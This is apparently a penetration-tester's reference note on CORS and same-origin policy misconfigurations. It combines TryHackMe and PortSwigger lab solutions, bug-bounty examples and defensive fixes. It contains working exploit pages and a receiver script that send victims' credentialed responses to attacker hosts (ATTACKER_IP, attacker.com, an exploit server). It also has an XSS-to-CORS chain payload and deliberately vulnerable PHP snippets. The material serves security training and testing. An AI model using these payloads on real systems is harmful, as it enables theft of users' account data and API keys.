---
title: "CORS and Same-Origin Policy (SOP)"
type: technique
tags: [client-side, cors, exploitation, h1, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-adv-cors-sop, h1-scraped-cors-sop, payloadsallthethings-cors, git-portswigger-all-labs]
---

# CORS and Same-Origin Policy (SOP)

## What it is

The **Same-Origin Policy (SOP)** is a browser security boundary. A web page at `http://site-a.com` may not read responses from `http://site-b.com` using JavaScript. **CORS (Cross-Origin Resource Sharing)** is the mechanism by which servers can selectively relax SOP restrictions. A misconfigured CORS policy allows an attacker's page to read authenticated responses from the target server using the victim's session cookies.

## How it works

When a cross-origin JavaScript request is made, the browser checks the response for:
- `Access-Control-Allow-Origin` (ACAO) — specifies which origins may read the response
- `Access-Control-Allow-Credentials` (ACAC) — if `true`, the browser includes cookies

If the server reflects the `Origin` request header back in ACAO (or allows a wildcard), an attacker's page can read the response with the victim's credentials attached. This breaks SOP for that origin.

### Pre-flight requests

For non-simple requests (e.g., `PUT`, `DELETE`, custom headers), the browser sends an `OPTIONS` pre-flight. If the server permits the method/headers in `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers`, the actual request proceeds. A misconfiguration here can be exploited the same way.

## Prerequisites

- Target server has a CORS misconfiguration (wildcard origin, reflected origin, or trusted null)
- Victim is authenticated to the target server
- Attacker can deliver JavaScript to the victim's browser (hosted page, stored XSS)
- Apache / web server accessible on attacker machine to receive exfiltrated data

## Misconfiguration Types

### 1. Arbitrary origin reflection

Server takes the `Origin` header value and mirrors it in `Access-Control-Allow-Origin` without validation:

```php
<?php
// Vulnerable — blindly reflects Origin
header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
header('Access-Control-Allow-Credentials: true');
```

### 2. Bad regex on origin

Server validates the origin using a loose regex that can be matched by a subdomain the attacker controls:

```php
// Vulnerable — matches "corssop.thm" anywhere in the origin string
if (preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
    header('Access-Control-Allow-Credentials: true');
}
```

Attacker uses origin `http://corssop.thm.evilcors.thm` — this matches the pattern and the server allows it.

### 3. Null origin trust

Some applications allow `Access-Control-Allow-Origin: null`. A `null` origin arises from several browser contexts:

- Sandboxed iframes (`sandbox` attribute without `allow-same-origin`)
- `data:` URI pages
- Local `file://` origins
- Some PDF viewer requests
- Legacy browser behaviour

```php
<?php
header('Access-Control-Allow-Origin: null');
header('Access-Control-Allow-Credentials: true');
```

### 4. Wildcard (no credentials)

`Access-Control-Allow-Origin: *` permits any origin to read the response. Per CORS spec, `*` cannot be combined with `Access-Control-Allow-Credentials: true`. Without credentials, sensitive data must be in the unauthenticated response body to be an issue. This can still enable CSRF (see [[csrf]]).

### 5. Trusted insecure protocol (HTTP subdomain)

The server allows any subdomain but does not restrict the scheme. An attacker who can execute XSS on an HTTP subdomain (e.g., via a stock-checker or public-facing service) can pivot: the XSS payload makes the credentialed cross-origin request to the HTTPS main app.

```http
GET /accountDetails HTTP/1.1
Host: vulnerable-website.com
Origin: http://stock.vulnerable-website.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://stock.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Exploit chain:
1. Find XSS on an HTTP subdomain trusted by the main origin's CORS policy
2. Inject a CORS request payload via the XSS vector
3. The subdomain's `null`-less origin is reflected — attacker reads the response with credentials

### 6. Expanding the Origin

Certain expansions of the original origin are not filtered on the server side due to badly implemented regular expressions (e.g., missing dot escaping).
- **Prefix injection**: `Origin: https://evilexample.com` accepted by a server trusting `example.com`.
- **Unescaped dot**: `Origin: https://apiiexample.com` accepted by a regex matching `^api.example.com$`.

## Methodology

1. **Probe for CORS** — send a request with `Origin: https://evil.com`; check if `Access-Control-Allow-Origin: https://evil.com` is returned with `Access-Control-Allow-Credentials: true`
2. **Test subdomain variant** — try `Origin: https://target.com.evil.com` for bad regex
3. **Test null origin** — try `Origin: null` (or use a sandboxed iframe)
4. **Set up exfiltrator** — host `receiver.php` on attacker machine (Apache + PHP)
5. **Craft exploit page** — JavaScript makes the authenticated cross-origin request and POSTs the response to the exfiltrator
6. **Deliver to victim** — via malicious hosted page, stored XSS, or phishing link

## Key Payloads / Examples

### Attacker exfiltrator server (receiver.php)

```php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');

$postdata = file_get_contents("php://input");
file_put_contents('data.txt', $postdata);
?>
```

Setup:
```bash
sudo apt install php apache2
touch /var/www/html/data.txt
chmod 0777 /var/www/html/data.txt
service apache2 start
```

### Arbitrary origin CORS exploit

```html
<html>
<head>
<script>
function exploit() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            exfiltrate(this.responseText);
        }
    };
    xhttp.open("GET", "http://target.com/sensitive.php", true);
    xhttp.withCredentials = true;
    xhttp.send();
}

function exfiltrate(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://ATTACKER_IP:81/receiver.php", true);
    xhr.withCredentials = true;
    var body = data;
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));
}
</script>
</head>
<body onload="exploit()">
</body>
</html>
```

### Null origin exploit via sandboxed iframe (XSS + CORS chaining)

Inject into a stored XSS sink:
```html
<div style="margin: 10px 20px 20px;">
    <iframe id="exploitFrame" style="display:none;"></iframe>
</div>

<script>
var exploitCode = `
  <script>
    function exploit() {
      var xhttp = new XMLHttpRequest();
      xhttp.open("GET", "http://target.com/null.php", true);
      xhttp.withCredentials = true;
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "http://ATTACKER_IP:81/receiver.php", true);
          xhr.withCredentials = true;
          var body = this.responseText;
          var aBody = new Uint8Array(body.length);
          for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
          xhr.send(new Blob([aBody]));
        }
      };
      xhttp.send();
    }
    exploit();
  <\/script>
`;
var encodedExploit = btoa(exploitCode);
document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
</script>
```

The iframe uses `data:` URL, which generates a `null` origin. If the target trusts `null`, the request succeeds with the victim's cookies.

### Quick browser-console CORS probe

Paste directly into browser DevTools to test any endpoint live:

```javascript
// Method 1 — minimal
var req = new XMLHttpRequest();
req.onload = function() { alert(this.responseText); };
req.open('GET', 'https://target-site.com/endpoint', true);
req.withCredentials = true;
req.send(null);
```

```javascript
// Method 2 — readyState check
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        alert(xhr.responseText);
    }
};
xhr.open('GET', 'https://target-site.com/api/v1/user', true);
xhr.withCredentials = true;
xhr.send(null);
```

### Null origin exploit via sandboxed iframe — srcdoc variant

Cleaner than a `data:` URL; works in modern browsers:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location = 'https://attacker.com/log?key=' + encodeURIComponent(this.responseText);
  };
  req.open('GET', 'https://target.com/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>
"></iframe>
```

The `sandbox` attribute without `allow-same-origin` causes the iframe to generate a `null` origin. If the server trusts `null`, the credentialed request succeeds.

### Verification via Burp

Manually add `Origin: https://evil.com` to a request and inspect the response:
- Vulnerable: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`
- Also check: `Origin: null`, `Origin: https://target.com.evil.com`

## Bypasses and Variants

| Bypass | Technique |
|--------|-----------|
| Regex weak match | Use `target.com.evil.com` or `eviltarget.com` depending on the pattern |
| Null origin | Use sandboxed iframe or `data:` URL |
| Pre-flight bypass | Simple requests (GET, POST with `application/x-www-form-urlencoded`) skip pre-flight |
| Wildcard + no credentials | Useful for CSRF if state-changing actions accept unauthenticated requests |

## Real-World Examples (HackerOne — paid reports)

4 paid reports (all of them). Top bounty: $550 (Zomato — sensitive info disclosure via reflected origin).

| Title | Severity | Bounty | Program | Report |
|-------|----------|--------|---------|--------|
| CORS Misconfiguration → sensitive info disclosure (zomato.com) | Medium | $550 | Eternal | [#426165](https://hackerone.com/reports/426165) |
| Permissive CORS trusting arbitrary extension origins | Medium | $500 | Grammarly (Superhuman) | [#412490](https://hackerone.com/reports/412490) |
| CORS bypass on TikTok Ads endpoint | Medium | $257 | TikTok | [#1001951](https://hackerone.com/reports/1001951) |
| CORS Misconfiguration → info disclosure (translate.kromtech.com) | Low | $50 | Clario | [#731472](https://hackerone.com/reports/731472) |

**Key patterns from reports:**
- All 4 reports are medium/low severity — CORS alone rarely reaches high/critical without credential leakage of high-value data
- Browser extension origin trust is a niche but real attack surface: Grammarly's extension had a permissive CORS policy trusting arbitrary extension origins
- API subdomains and translation endpoints are common targets (TikTok Ads, Zomato, Kromtech translate)
- Bounties are modest ($50–$550) unless sensitive data (PII, auth tokens) is demonstrably exposed

## Detection and Defence

| Issue | Fix |
|-------|-----|
| Reflected origin | Maintain an explicit allowlist of trusted origins; never mirror the `Origin` header without checking against it |
| Bad regex | Anchor the regex (`^https://exact\.domain\.com$`) |
| Null origin trust | Remove `null` from allowed origins except in controlled environments |
| Wildcard `*` | Never use `*` with `Access-Control-Allow-Credentials: true` (blocked by spec, but avoid both together) |
| CORS + CSRF | Set `SameSite=Strict` on cookies as a secondary defence |

**Testing checklist:**
```bash
# Test reflected origin
curl -s -I -H "Origin: https://evil.com" https://target.com/api/data | grep -i "access-control"

# Test null origin
curl -s -I -H "Origin: null" https://target.com/api/data | grep -i "access-control"

# Test subdomain variant
curl -s -I -H "Origin: https://target.com.evil.com" https://target.com/api/data | grep -i "access-control"
```

## Tools

- [[burp-suite]] — add Origin header, inspect CORS response headers
- Apache2 + PHP — host exfiltrator server
- Browser DevTools Network tab — observe XHR connections and CORS headers
- `Corsy` — CORS Misconfiguration Scanner
- `CORScanner` — Fast CORS misconfiguration vulnerabilities scanner
- `PostMessage` — POC Builder

## PortSwigger Labs

### Lab 1 — CORS vulnerability with basic origin reflection (Apprentice)

**Misconfiguration:** `/accountDetails` endpoint reflects any `Origin` value in `Access-Control-Allow-Origin` while also returning `Access-Control-Allow-Credentials: true`.

**Detect:**
```http
GET /accountDetails HTTP/1.1
Origin: evil.me

HTTP/1.1 200 OK
Access-Control-Allow-Origin: evil.me
Access-Control-Allow-Credentials: true
```

**Exploit** (deploy on attacker exploit server):
```javascript
var r = new XMLHttpRequest();
r.open('GET', 'https://TARGET.web-security-academy.net/accountDetails', false);
r.withCredentials = true;
r.send();
var obj = JSON.parse(r.responseText);
var r2 = new XMLHttpRequest();
r2.open('GET', 'https://EXPLOIT-SERVER.exploit-server.net/?user=' + obj.username + '&apikey=' + obj.apikey, false);
r2.send();
```

Goal: steal `username` + `apikey` from the victim's `/accountDetails` response.

---

### Lab 2 — CORS vulnerability with trusted null origin (Apprentice)

**Misconfiguration:** Server does not reflect arbitrary origins but explicitly allows `Origin: null`.

**Detect:**
```http
GET /accountDetails HTTP/1.1
Origin: null

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploit** — sandboxed iframe with `srcdoc`:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location = 'https://EXPLOIT-SERVER.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
  };
  req.open('GET', 'https://TARGET.web-security-academy.net/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>
"></iframe>
```

The `sandbox` attribute (without `allow-same-origin`) forces the iframe's origin to `null`, satisfying the server's allowlist.

---

### Lab 3 — CORS vulnerability with trusted insecure protocols (Practitioner)

**Misconfiguration:** Main HTTPS app trusts any subdomain origin, including HTTP subdomains (e.g., `http://stock.TARGET.net`). A reflected XSS on the stock-checker subdomain (`productId` parameter) provides the injection point.

**Chain:** XSS on HTTP subdomain → CORS credentialed request to HTTPS main app

**Step 1 — Confirm subdomain is trusted:**
```http
GET /accountDetails HTTP/1.1
Origin: http://stock.TARGET.web-security-academy.net

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://stock.TARGET.web-security-academy.net
Access-Control-Allow-Credentials: true
```

**Step 2 — Confirm XSS on stock subdomain** (`productId` parameter):
```http
GET /?productId=<script>alert(1)</script>&storeId=1 HTTP/1.1
Host: stock.TARGET.web-security-academy.net
```

**Step 3 — Full exploit payload** (deliver via exploit server):
```html
<script>
document.location = "http://stock.TARGET.web-security-academy.net/?productId="
  + "<script>"
  + "var req=new XMLHttpRequest();"
  + "req.onload=function(){location='https://EXPLOIT-SERVER.exploit-server.net/log?key='+encodeURIComponent(this.responseText)};"
  + "req.open('GET','https://TARGET.web-security-academy.net/accountDetails',true);"
  + "req.withCredentials=true;"
  + "req.send();"
  + "<\/script>"
  + "&storeId=1";
</script>
```

**Key insight:** The HTTP subdomain is within the CORS allowlist because the server matches on domain name without enforcing HTTPS. Any XSS on any trusted subdomain (regardless of protocol) is a full CORS bypass.

---

## Sources

- THM CORS & SOP room (`https://tryhackme.com/room/corsandsop`)
